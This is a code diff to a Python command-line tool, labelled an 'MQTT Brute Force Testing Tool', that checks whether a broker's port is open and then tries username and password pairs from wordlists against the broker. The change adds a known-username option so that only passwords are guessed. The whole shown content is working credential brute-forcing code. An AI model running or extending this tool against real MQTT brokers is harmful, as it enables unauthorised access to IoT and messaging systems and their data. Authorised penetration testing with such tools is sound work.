@@ -46,9 +46,16 @@ def attempt_mqtt_connection(broker, port, username, password):
         return False
 
 # Brute force function
-def brute_force_mqtt(broker, port, userlist, passlist):
-    with open(userlist, 'r') as ufile, open(passlist, 'r') as pfile:
-        usernames = [line.strip() for line in ufile]
+def brute_force_mqtt(broker, port, username, userlist, passlist):
+    if username:
+        print(f"[*] Using provided username: {username}")
+        usernames = [username]  # Use only the provided username
+    else:
+        print("[*] No username provided. Brute-forcing usernames and passwords.")
+        with open(userlist, 'r') as ufile:
+            usernames = [line.strip() for line in ufile]
+
+    with open(passlist, 'r') as pfile:
         passwords = [line.strip() for line in pfile]
 
     for username in usernames:
@@ -63,14 +70,19 @@ if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="MQTT Brute Force Testing Tool")
     parser.add_argument("-b", "--broker", required=True, help="MQTT broker IP address")
     parser.add_argument("-p", "--port", type=int, default=1883, help="MQTT broker port (default: 1883)")
-    parser.add_argument("-U", "--userlist", required=True, help="Path to username wordlist")
+    parser.add_argument("-u", "--username", help="Known username (if provided, only passwords will be brute-forced)")
+    parser.add_argument("-U", "--userlist", help="Path to username wordlist (required if username is not provided)")
     parser.add_argument("-P", "--passlist", required=True, help="Path to password wordlist")
 
     args = parser.parse_args()
 
+    # Ensure userlist is provided if username is not known
+    if not args.username and not args.userlist:
+        parser.error("[!] You must provide a username (-u) or a username wordlist (-U).")
+
     # Check if the port is open before proceeding
     if is_port_open(args.broker, args.port):
         print(f"[*] Starting MQTT brute force on {args.broker}:{args.port}")
-        brute_force_mqtt(args.broker, args.port, args.userlist, args.passlist)
+        brute_force_mqtt(args.broker, args.port, args.username, args.userlist, args.passlist)
     else:
         print("[!] Exiting the script.")
